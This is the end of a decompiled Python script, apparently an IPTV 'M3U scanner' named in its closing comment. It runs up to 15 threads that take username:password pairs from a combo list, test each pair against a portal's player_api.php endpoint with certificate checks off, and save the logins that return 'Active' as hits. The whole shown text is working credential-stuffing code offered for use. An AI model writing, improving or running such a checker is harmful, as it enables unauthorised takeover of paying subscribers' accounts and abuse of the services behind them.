            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


def d15():
    global hit
    say = 0
    for fyz in range(15, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "feyzo"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "feyzo"

            say = int(say) + 1
            bot = "Bot_15"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("    ✪ 🌟 🇭 🇮 🇹 🌟 ✪                   ")
                    hit = hit + 1
                    sesdosya = "/sdcard/qpython/gun.mp3"
                    file = pathlib.Path(sesdosya)
                    try:
                        if file.exists():
                            ad.mediaPlay(sesdosya)
                    except:
                        pass

                    onay(veri, user, pas)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t1.start()
if botsay == 2 or botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t2.start()
if botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t3.start()
if botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t4.start()
if botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t5.start()
if botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t6.start()
if botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t7.start()
if botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t8.start()
if botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t9.start()
if botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t10.start()
if botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t11.start()
if botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t12.start()
if botsay == 13 or botsay == 14 or botsay == 15:
    t13.start()
if botsay == 14 or botsay == 15:
    t14.start()
if botsay == 15:
    t15.start()

# okay decompiling A_pxlm3uProScanner15v5_decoded.pyc
